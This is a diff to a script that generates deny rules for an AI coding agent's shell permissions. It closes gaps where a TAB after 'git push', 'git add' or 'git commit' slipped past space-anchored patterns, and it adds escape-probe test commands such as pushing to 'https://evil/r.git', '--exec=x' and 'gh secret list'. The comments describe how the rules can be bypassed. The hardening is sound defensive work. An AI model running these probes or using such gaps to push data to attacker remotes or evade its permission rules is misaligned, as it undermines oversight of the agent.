@@ -194,20 +194,26 @@ elif kind == "coach":
     #     matches `git add --update`.
     #   dest-not-first — URL/path dest after a flag (`git push --force
     #     https://evil/r.git HEAD`) and relative dests the dest-first
-    #     prefix list never named (`../`, `foo/bar.git`). `git push *https*`
-    #     (a `*` in the spec, and *not* a trailing `:*` — that suffix is
-    #     word-boundary and would miss `https://`). Same for the other
-    #     schemes, `*git@*`, `*..*`, `*.git*`, `*/*`, `*:* *` (scp-like
-    #     with a following argv; trailing ` *` stops `:*` parsing), and
-    #     `*:**` / `*:** *` (bare scp `host:path` — the extra trailing `*`
-    #     keeps the pattern from ending in `:*`, which would become a
-    #     word-boundary prefix of `git push *` and deny every push).
+    #     prefix list never named (`../`, `foo/bar.git`). `git push*https*`
+    #     (no required space after the verb — a literal space would miss
+    #     IFS TAB splits — a `*` in the spec, and *not* a trailing `:*`,
+    #     which is word-boundary and would miss `https://`). Same for the
+    #     other schemes, `*git@*`, `*..*`, `*.git*`, `*/*`, `*:* *`
+    #     (scp-like with a following argv; trailing ` *` stops `:*`
+    #     parsing), and `*:**` / `*:** *` (bare scp `host:path` — the
+    #     extra trailing `*` keeps the pattern from ending in `:*`, which
+    #     would become a word-boundary prefix of `git push*` and deny
+    #     every push). Short option-first stems keep an explicit TAB
+    #     twin (`git add\t-e:*`) because `git add*-e*` would also match
+    #     a path ending in `-e`.
     #   remote retarget — `git remote set-url` / `git remote add` rewrite
     #     where `git push origin HEAD` goes. `Bash(git remote-*)` only
     #     matches hyphenated helpers (`git remote-ext`); `Bash(git remote:*)`
-    #     + `Bash(git remote*)` close the space-form verb. Denying the
-    #     rewrite keeps the AC4-open push from publishing to an attacker
-    #     URL under the same remote name.
+    #     + `Bash(git remote*)` close the space-form verb (and already
+    #     need no space after `remote`, the same shape the TAB fix uses
+    #     for push/add/commit/checkout). Denying the rewrite keeps the
+    #     AC4-open push from publishing to an attacker URL under the
+    #     same remote name.
     # An option after another token (`git push origin --exec=x`,
     # `git commit -m x --gpg-sign`, `git add designs --edit`) is a shape no
     # prefix rule sees — named on the PR; the parent (#763) alternative is
@@ -226,14 +232,16 @@ elif kind == "coach":
     #   commit — findings: --edit/-e and --reedit-message/-c (Q1, editor;
     #     shortest unique prefixes `--e` / `--ree`); --gpg-sign/-S (Q1,
     #     runs gpg; shortest unique prefix `--g`; -Skeyid is a stuck
-    #     combined form via `-?S*`); clustered `-aS`/`-sS`/`-amS` via
-    #     `-*S *`/`-?S`, clustered `-ae`/`-ac`/`-aem` via `-*e *`/`-?e`/
-    #     `-?e?` / `-*c *`/`-?c`/`-?c?`. Bare `git commit` (no -m) also
-    #     launches the editor: that is not an option a prefix can refuse
-    #     without swallowing `git commit -m`, so it is the wrapper case,
-    #     not a deny. Other options (message/file/author/date/amend/
-    #     signoff/trailer/cleanup/pathspec-from-file) do not meet the
-    #     three questions.
+    #     combined form via `-S*`); --template/-t (Q1, primes the message
+    #     then opens the editor; shortest unique prefix `--te`, distinct
+    #     from `--trailer`/`--tr`); --squash/`--sq` (Q1, builds an
+    #     autosquash message and implies --edit); clustered `-aS`/`-sS`/
+    #     `-amS` via `-*S *`, clustered `-ae`/`-ac`/`-aem` via `-*e *` /
+    #     `-*c *`. Bare `git commit` (no -m) also launches the editor:
+    #     that is not an option a prefix can refuse without swallowing
+    #     `git commit -m`, so it is the wrapper case, not a deny. Other
+    #     options (message/file/author/date/amend/signoff/trailer/
+    #     cleanup/pathspec-from-file) do not meet the three questions.
     #   push — findings: --receive-pack/--exec (Q1; shortest unique
     #     prefixes `--rece` / `--e`); --repo (Q3; `--rep`); --recurse-
     #     submodules (Q3; `--recu`); a URL or path as the repository
@@ -284,8 +292,8 @@ elif kind == "coach":
         {"Bash(git remote-*)"},
         {"Bash(git instaweb:*)"},
         {"Bash(git send-email:*)"},
-        {"Bash(git add --e:*)"},
-        {"Bash(git add --e*)"},
+        {"Bash(git add*--e:*)"},
+        {"Bash(git add*--e*)"},
         {"Bash(git add -e:*)"},
         {"Bash(git add -e*)"},
         {"Bash(git add -pe:*)"},
@@ -442,10 +450,10 @@ elif kind == "coach":
         {"Bash(git add -eia)"},
         {"Bash(git add * -eia)"},
         {"Bash(git add * -eia *)"},
-        {"Bash(git checkout --r:*)"},
-        {"Bash(git checkout --r*)"},
-        {"Bash(git commit --e:*)"},
-        {"Bash(git commit --e*)"},
+        {"Bash(git checkout*--r:*)"},
+        {"Bash(git checkout*--r*)"},
+        {"Bash(git commit*--e:*)"},
+        {"Bash(git commit*--e*)"},
         {"Bash(git commit -e:*)"},
         {"Bash(git commit -e*)"},
         {"Bash(git commit -*e *)"},
@@ -502,8 +510,8 @@ elif kind == "coach":
         {"Bash(git commit -eav)"},
         {"Bash(git commit * -eav)"},
         {"Bash(git commit * -eav *)"},
-        {"Bash(git commit --ree:*)"},
-        {"Bash(git commit --ree*)"},
+        {"Bash(git commit*--ree:*)"},
+        {"Bash(git commit*--ree*)"},
         {"Bash(git commit -c:*)"},
         {"Bash(git commit -c*)"},
         {"Bash(git commit -*c *)"},
@@ -535,8 +543,8 @@ elif kind == "coach":
         {"Bash(git commit -acs)"},
         {"Bash(git commit * -acs)"},
         {"Bash(git commit * -acs *)"},
-        {"Bash(git commit --g:*)"},
-        {"Bash(git commit --g*)"},
+        {"Bash(git commit*--g:*)"},
+        {"Bash(git commit*--g*)"},
         {"Bash(git commit -S:*)"},
         {"Bash(git commit -S*)"},
         {"Bash(git commit -*S *)"},
@@ -598,50 +606,47 @@ elif kind == "coach":
         {"Bash(git commit -sSm)"},
         {"Bash(git commit * -sSm)"},
         {"Bash(git commit * -sSm *)"},
-        {"Bash(git push --rece:*)"},
-        {"Bash(git push --rece*)"},
-        {"Bash(git push --e:*)"},
-        {"Bash(git push --e*)"},
-        {"Bash(git push --rep:*)"},
-        {"Bash(git push --rep*)"},
-        {"Bash(git push --recu:*)"},
-        {"Bash(git push --recu*)"},
-        {"Bash(git push https:*)"},
-        {"Bash(git push https*)"},
-        {"Bash(git push *https*)"},
-        {"Bash(git push http:*)"},
-        {"Bash(git push http*)"},
-        {"Bash(git push *http://*)"},
-        {"Bash(git push ssh:*)"},
-        {"Bash(git push ssh*)"},
-        {"Bash(git push *ssh://*)"},
-        {"Bash(git push git:*)"},
-        {"Bash(git push git*)"},
-        {"Bash(git push *git://*)"},
-        {"Bash(git push *git@*)"},
-        {"Bash(git push ftp:*)"},
-        {"Bash(git push ftp*)"},
-        {"Bash(git push *ftp://*)"},
-        {"Bash(git push file:*)"},
-        {"Bash(git push file*)"},
-        {"Bash(git push *file://*)"},
-        {"Bash(git push ext:*)"},
-        {"Bash(git push ext*)"},
-        {"Bash(git push *ext*)"},
-        {"Bash(git push /:*)"},
-        {"Bash(git push /*)"},
-        {"Bash(git push ./:*)"},
-        {"Bash(git push ./*)"},
-        {"Bash(git push .)"},
-        {"Bash(git push . *)"},
-        {"Bash(git push ~:*)"},
-        {"Bash(git push ~*)"},
-        {"Bash(git push *..*)"},
-        {"Bash(git push *.git*)"},
-        {"Bash(git push */*)"},
-        {"Bash(git push *:* *)"},
-        {"Bash(git push *:**)"},
-        {"Bash(git push *:** *)"},
+        {"Bash(git push*--rece:*)"},
+        {"Bash(git push*--rece*)"},
+        {"Bash(git push*--e:*)"},
+        {"Bash(git push*--e*)"},
+        {"Bash(git push*--rep:*)"},
+        {"Bash(git push*--rep*)"},
+        {"Bash(git push*--recu:*)"},
+        {"Bash(git push*--recu*)"},
+        {"Bash(git push*https:*)"},
+        {"Bash(git push*https*)"},
+        {"Bash(git push*http:*)"},
+        {"Bash(git push*http*)"},
+        {"Bash(git push*http://*)"},
+        {"Bash(git push*ssh:*)"},
+        {"Bash(git push*ssh*)"},
+        {"Bash(git push*ssh://*)"},
+        {"Bash(git push*git:*)"},
+        {"Bash(git push*git*)"},
+        {"Bash(git push*git://*)"},
+        {"Bash(git push*git@*)"},
+        {"Bash(git push*ftp:*)"},
+        {"Bash(git push*ftp*)"},
+        {"Bash(git push*ftp://*)"},
+        {"Bash(git push*file:*)"},
+        {"Bash(git push*file*)"},
+        {"Bash(git push*file://*)"},
+        {"Bash(git push*ext:*)"},
+        {"Bash(git push*ext*)"},
+        {"Bash(git push*/:*)"},
+        {"Bash(git push*/*)"},
+        {"Bash(git push*./:*)"},
+        {"Bash(git push*./*)"},
+        {"Bash(git push*.)"},
+        {"Bash(git push*. *)"},
+        {"Bash(git push*~:*)"},
+        {"Bash(git push*~*)"},
+        {"Bash(git push*..*)"},
+        {"Bash(git push*.git*)"},
+        {"Bash(git push*:* *)"},
+        {"Bash(git push*:**)"},
+        {"Bash(git push*:** *)"},
         {"Bash(git add -ve)"},
         {"Bash(git add -ve:*)"},
         {"Bash(git add -ve*)"},
@@ -715,6 +720,111 @@ elif kind == "coach":
         {"Bash(git commit -uS*)"},
         {"Bash(git commit -FS:*)"},
         {"Bash(git commit -FS*)"},
+        {"Bash(git add\t-e:*)"},
+        {"Bash(git add\t-e*)"},
+        {"Bash(git add\t-pe:*)"},
+        {"Bash(git add\t-pe*)"},
+        {"Bash(git add\t-ue:*)"},
+        {"Bash(git add\t-ue*)"},
+        {"Bash(git add\t-e)"},
+        {"Bash(git add\t-ie:*)"},
+        {"Bash(git add\t-ie*)"},
+        {"Bash(git add\t-ie)"},
+        {"Bash(git add\t-pe)"},
+        {"Bash(git add\t-ue)"},
+        {"Bash(git add\t-ei:*)"},
+        {"Bash(git add\t-ei*)"},
+        {"Bash(git add\t-ei)"},
+        {"Bash(git add\t-ep:*)"},
+        {"Bash(git add\t-ep*)"},
+        {"Bash(git add\t-ep)"},
+        {"Bash(git add\t-eu:*)"},
+        {"Bash(git add\t-eu*)"},
+        {"Bash(git add\t-eu)"},
+        {"Bash(git commit\t-e:*)"},
+        {"Bash(git commit\t-e*)"},
+        {"Bash(git commit\t-e)"},
+        {"Bash(git commit\t-ae:*)"},
+        {"Bash(git commit\t-ae*)"},
+        {"Bash(git commit\t-ae)"},
+        {"Bash(git commit\t-ea:*)"},
+        {"Bash(git commit\t-ea*)"},
+        {"Bash(git commit\t-ea)"},
+        {"Bash(git commit\t-c:*)"},
+        {"Bash(git commit\t-c*)"},
+        {"Bash(git commit\t-c)"},
+        {"Bash(git commit\t-ac:*)"},
+        {"Bash(git commit\t-ac*)"},
+        {"Bash(git commit\t-ac)"},
+        {"Bash(git commit\t-ca:*)"},
+        {"Bash(git commit\t-ca*)"},
+        {"Bash(git commit\t-ca)"},
+        {"Bash(git commit\t-S:*)"},
+        {"Bash(git commit\t-S*)"},
+        {"Bash(git commit\t-aS*)"},
+        {"Bash(git commit\t-sS*)"},
+        {"Bash(git commit\t-amS*)"},
+        {"Bash(git commit\t-S)"},
+        {"Bash(git commit\t-aS:*)"},
+        {"Bash(git commit\t-aS)"},
+        {"Bash(git commit\t-sS:*)"},
+        {"Bash(git commit\t-sS)"},
+        {"Bash(git commit\t-amS:*)"},
+        {"Bash(git commit\t-amS)"},
+        {"Bash(git add\t-ve)"},
+        {"Bash(git add\t-ve:*)"},
+        {"Bash(git add\t-ve*)"},
+        {"Bash(git add\t-ne)"},
+        {"Bash(git add\t-ne:*)"},
+        {"Bash(git add\t-ne*)"},
+        {"Bash(git add\t-fe)"},
+        {"Bash(git add\t-fe:*)"},
+        {"Bash(git add\t-fe*)"},
+        {"Bash(git add\t-Ae)"},
+        {"Bash(git add\t-Ae:*)"},
+        {"Bash(git add\t-Ae*)"},
+        {"Bash(git add\t-Ne)"},
+        {"Bash(git add\t-Ne:*)"},
+        {"Bash(git add\t-Ne*)"},
+        {"Bash(git add\t-ev)"},
+        {"Bash(git add\t-ev:*)"},
+        {"Bash(git add\t-ev*)"},
+        {"Bash(git add\t-en)"},
+        {"Bash(git add\t-en:*)"},
+        {"Bash(git add\t-en*)"},
+        {"Bash(git commit\t-qe)"},
+        {"Bash(git commit\t-qe:*)"},
+        {"Bash(git commit\t-qe*)"},
+        {"Bash(git commit\t-eq)"},
+        {"Bash(git commit\t-eq:*)"},
+        {"Bash(git commit\t-eq*)"},
+        {"Bash(git commit\t-ne)"},
+        {"Bash(git commit\t-ne:*)"},
+        {"Bash(git commit\t-ne*)"},
+        {"Bash(git commit\t-nS:*)"},
+        {"Bash(git commit\t-nS*)"},
+        {"Bash(git commit\t-qS:*)"},
+        {"Bash(git commit\t-qS*)"},
+        {"Bash(git commit\t-vS:*)"},
+        {"Bash(git commit\t-vS*)"},
+        {"Bash(git commit\t-tS:*)"},
+        {"Bash(git commit\t-tS*)"},
+        {"Bash(git commit\t-uS:*)"},
+        {"Bash(git commit\t-uS*)"},
+        {"Bash(git commit\t-FS:*)"},
+        {"Bash(git commit\t-FS*)"},
+        {"Bash(git commit*--te:*)"},
+        {"Bash(git commit*--te*)"},
+        {"Bash(git commit -t:*)"},
+        {"Bash(git commit -t*)"},
+        {"Bash(git commit -t)"},
+        {"Bash(git commit\t-t:*)"},
+        {"Bash(git commit\t-t*)"},
+        {"Bash(git commit\t-t)"},
+        {"Bash(git commit * -t)"},
+        {"Bash(git commit * -t *)"},
+        {"Bash(git commit*--sq:*)"},
+        {"Bash(git commit*--sq*)"},
     ]
 else:
     sys.stderr.write(f"unknown backstop kind {kind!r}\n")
@@ -846,6 +956,17 @@ ESCAPE_PROBES = [
     "git push designs/../../outside.git HEAD",
     "git push --force host:repo.git HEAD",
     "git push host:repo", "git push --force host:repo", "git push -u host:path",
+    # TAB after the verb (default IFS): space-anchored denies miss these.
+    "git push\thttps://evil/r.git HEAD",
+    "git push\thost:repo",
+    "git add\t-e file",
+    "git commit\t-e",
+    "git commit\t--gpg-sign=x",
+    "git checkout\t--recurse-submodules",
+    "git push\t--exec=x origin",
+    # --template / --squash open GIT_EDITOR (option-first).
+    "git commit --template=x", "git commit --te=x", "git commit -t file",
+    "git commit --squash=HEAD", "git commit --sq=HEAD",
     "gh alias set x y", "gh extension install o/r", "gh ext exec x",
     "gh config set pager x", "gh codespace ssh", "gh cs ssh",
     "gh secret list", "gh ssh-key add k", "gh gpg-key add k",
@@ -1093,8 +1214,8 @@ EOF
     "Bash(git remote-*)"
     "Bash(git instaweb:*)"
     "Bash(git send-email:*)"
-    "Bash(git add --e:*)"
-    "Bash(git add --e*)"
+    "Bash(git add*--e:*)"
+    "Bash(git add*--e*)"
     "Bash(git add -e:*)"
     "Bash(git add -e*)"
     "Bash(git add -pe:*)"
@@ -1251,10 +1372,10 @@ EOF
     "Bash(git add -eia)"
     "Bash(git add * -eia)"
     "Bash(git add * -eia *)"
-    "Bash(git checkout --r:*)"
-    "Bash(git checkout --r*)"
-    "Bash(git commit --e:*)"
-    "Bash(git commit --e*)"
+    "Bash(git checkout*--r:*)"
+    "Bash(git checkout*--r*)"
+    "Bash(git commit*--e:*)"
+    "Bash(git commit*--e*)"
     "Bash(git commit -e:*)"
     "Bash(git commit -e*)"
     "Bash(git commit -*e *)"
@@ -1311,8 +1432,8 @@ EOF
     "Bash(git commit -eav)"
     "Bash(git commit * -eav)"
     "Bash(git commit * -eav *)"
-    "Bash(git commit --ree:*)"
-    "Bash(git commit --ree*)"
+    "Bash(git commit*--ree:*)"
+    "Bash(git commit*--ree*)"
     "Bash(git commit -c:*)"
     "Bash(git commit -c*)"
     "Bash(git commit -*c *)"
@@ -1344,8 +1465,8 @@ EOF
     "Bash(git commit -acs)"
     "Bash(git commit * -acs)"
     "Bash(git commit * -acs *)"
-    "Bash(git commit --g:*)"
-    "Bash(git commit --g*)"
+    "Bash(git commit*--g:*)"
+    "Bash(git commit*--g*)"
     "Bash(git commit -S:*)"
     "Bash(git commit -S*)"
     "Bash(git commit -*S *)"
@@ -1407,50 +1528,47 @@ EOF
     "Bash(git commit -sSm)"
     "Bash(git commit * -sSm)"
     "Bash(git commit * -sSm *)"
-    "Bash(git push --rece:*)"
-    "Bash(git push --rece*)"
-    "Bash(git push --e:*)"
-    "Bash(git push --e*)"
-    "Bash(git push --rep:*)"
-    "Bash(git push --rep*)"
-    "Bash(git push --recu:*)"
-    "Bash(git push --recu*)"
-    "Bash(git push https:*)"
-    "Bash(git push https*)"
-    "Bash(git push *https*)"
-    "Bash(git push http:*)"
-    "Bash(git push http*)"
-    "Bash(git push *http://*)"
-    "Bash(git push ssh:*)"
-    "Bash(git push ssh*)"
-    "Bash(git push *ssh://*)"
-    "Bash(git push git:*)"
-    "Bash(git push git*)"
-    "Bash(git push *git://*)"
-    "Bash(git push *git@*)"
-    "Bash(git push ftp:*)"
-    "Bash(git push ftp*)"
-    "Bash(git push *ftp://*)"
-    "Bash(git push file:*)"
-    "Bash(git push file*)"
-    "Bash(git push *file://*)"
-    "Bash(git push ext:*)"
-    "Bash(git push ext*)"
-    "Bash(git push *ext*)"
-    "Bash(git push /:*)"
-    "Bash(git push /*)"
-    "Bash(git push ./:*)"
-    "Bash(git push ./*)"
-    "Bash(git push .)"
-    "Bash(git push . *)"
-    "Bash(git push ~:*)"
-    "Bash(git push ~*)"
-    "Bash(git push *..*)"
-    "Bash(git push *.git*)"
-    "Bash(git push */*)"
-    "Bash(git push *:* *)"
-    "Bash(git push *:**)"
-    "Bash(git push *:** *)"
+    "Bash(git push*--rece:*)"
+    "Bash(git push*--rece*)"
+    "Bash(git push*--e:*)"
+    "Bash(git push*--e*)"
+    "Bash(git push*--rep:*)"
+    "Bash(git push*--rep*)"
+    "Bash(git push*--recu:*)"
+    "Bash(git push*--recu*)"
+    "Bash(git push*https:*)"
+    "Bash(git push*https*)"
+    "Bash(git push*http:*)"
+    "Bash(git push*http*)"
+    "Bash(git push*http://*)"
+    "Bash(git push*ssh:*)"
+    "Bash(git push*ssh*)"
+    "Bash(git push*ssh://*)"
+    "Bash(git push*git:*)"
+    "Bash(git push*git*)"
+    "Bash(git push*git://*)"
+    "Bash(git push*git@*)"
+    "Bash(git push*ftp:*)"
+    "Bash(git push*ftp*)"
+    "Bash(git push*ftp://*)"
+    "Bash(git push*file:*)"
+    "Bash(git push*file*)"
+    "Bash(git push*file://*)"
+    "Bash(git push*ext:*)"
+    "Bash(git push*ext*)"
+    "Bash(git push*/:*)"
+    "Bash(git push*/*)"
+    "Bash(git push*./:*)"
+    "Bash(git push*./*)"
+    "Bash(git push*.)"
+    "Bash(git push*. *)"
+    "Bash(git push*~:*)"
+    "Bash(git push*~*)"
+    "Bash(git push*..*)"
+    "Bash(git push*.git*)"
+    "Bash(git push*:* *)"
+    "Bash(git push*:**)"
+    "Bash(git push*:** *)"
     "Bash(git add -ve)"
     "Bash(git add -ve:*)"
     "Bash(git add -ve*)"
@@ -1524,6 +1642,111 @@ EOF
     "Bash(git commit -uS*)"
     "Bash(git commit -FS:*)"
     "Bash(git commit -FS*)"
+    $'Bash(git add\t-e:*)'
+    $'Bash(git add\t-e*)'
+    $'Bash(git add\t-pe:*)'
+    $'Bash(git add\t-pe*)'
+    $'Bash(git add\t-ue:*)'
+    $'Bash(git add\t-ue*)'
+    $'Bash(git add\t-e)'
+    $'Bash(git add\t-ie:*)'
+    $'Bash(git add\t-ie*)'
+    $'Bash(git add\t-ie)'
+    $'Bash(git add\t-pe)'
+    $'Bash(git add\t-ue)'
+    $'Bash(git add\t-ei:*)'
+    $'Bash(git add\t-ei*)'
+    $'Bash(git add\t-ei)'
+    $'Bash(git add\t-ep:*)'
+    $'Bash(git add\t-ep*)'
+    $'Bash(git add\t-ep)'
+    $'Bash(git add\t-eu:*)'
+    $'Bash(git add\t-eu*)'
+    $'Bash(git add\t-eu)'
+    $'Bash(git commit\t-e:*)'
+    $'Bash(git commit\t-e*)'
+    $'Bash(git commit\t-e)'
+    $'Bash(git commit\t-ae:*)'
+    $'Bash(git commit\t-ae*)'
+    $'Bash(git commit\t-ae)'
+    $'Bash(git commit\t-ea:*)'
+    $'Bash(git commit\t-ea*)'
+    $'Bash(git commit\t-ea)'
+    $'Bash(git commit\t-c:*)'
+    $'Bash(git commit\t-c*)'
+    $'Bash(git commit\t-c)'
+    $'Bash(git commit\t-ac:*)'
+    $'Bash(git commit\t-ac*)'
+    $'Bash(git commit\t-ac)'
+    $'Bash(git commit\t-ca:*)'
+    $'Bash(git commit\t-ca*)'
+    $'Bash(git commit\t-ca)'
+    $'Bash(git commit\t-S:*)'
+    $'Bash(git commit\t-S*)'
+    $'Bash(git commit\t-aS*)'
+    $'Bash(git commit\t-sS*)'
+    $'Bash(git commit\t-amS*)'
+    $'Bash(git commit\t-S)'
+    $'Bash(git commit\t-aS:*)'
+    $'Bash(git commit\t-aS)'
+    $'Bash(git commit\t-sS:*)'
+    $'Bash(git commit\t-sS)'
+    $'Bash(git commit\t-amS:*)'
+    $'Bash(git commit\t-amS)'
+    $'Bash(git add\t-ve)'
+    $'Bash(git add\t-ve:*)'
+    $'Bash(git add\t-ve*)'
+    $'Bash(git add\t-ne)'
+    $'Bash(git add\t-ne:*)'
+    $'Bash(git add\t-ne*)'
+    $'Bash(git add\t-fe)'
+    $'Bash(git add\t-fe:*)'
+    $'Bash(git add\t-fe*)'
+    $'Bash(git add\t-Ae)'
+    $'Bash(git add\t-Ae:*)'
+    $'Bash(git add\t-Ae*)'
+    $'Bash(git add\t-Ne)'
+    $'Bash(git add\t-Ne:*)'
+    $'Bash(git add\t-Ne*)'
+    $'Bash(git add\t-ev)'
+    $'Bash(git add\t-ev:*)'
+    $'Bash(git add\t-ev*)'
+    $'Bash(git add\t-en)'
+    $'Bash(git add\t-en:*)'
+    $'Bash(git add\t-en*)'
+    $'Bash(git commit\t-qe)'
+    $'Bash(git commit\t-qe:*)'
+    $'Bash(git commit\t-qe*)'
+    $'Bash(git commit\t-eq)'
+    $'Bash(git commit\t-eq:*)'
+    $'Bash(git commit\t-eq*)'
+    $'Bash(git commit\t-ne)'
+    $'Bash(git commit\t-ne:*)'
+    $'Bash(git commit\t-ne*)'
+    $'Bash(git commit\t-nS:*)'
+    $'Bash(git commit\t-nS*)'
+    $'Bash(git commit\t-qS:*)'
+    $'Bash(git commit\t-qS*)'
+    $'Bash(git commit\t-vS:*)'
+    $'Bash(git commit\t-vS*)'
+    $'Bash(git commit\t-tS:*)'
+    $'Bash(git commit\t-tS*)'
+    $'Bash(git commit\t-uS:*)'
+    $'Bash(git commit\t-uS*)'
+    $'Bash(git commit\t-FS:*)'
+    $'Bash(git commit\t-FS*)'
+    "Bash(git commit*--te:*)"
+    "Bash(git commit*--te*)"
+    "Bash(git commit -t:*)"
+    "Bash(git commit -t*)"
+    "Bash(git commit -t)"
+    $'Bash(git commit\t-t:*)'
+    $'Bash(git commit\t-t*)'
+    $'Bash(git commit\t-t)'
+    "Bash(git commit * -t)"
+    "Bash(git commit * -t *)"
+    "Bash(git commit*--sq:*)"
+    "Bash(git commit*--sq*)"
   )
   python3 - "$tmp/reviewer.json" "${GH_FLOOR[@]}" <<'PY2'
 import json, sys
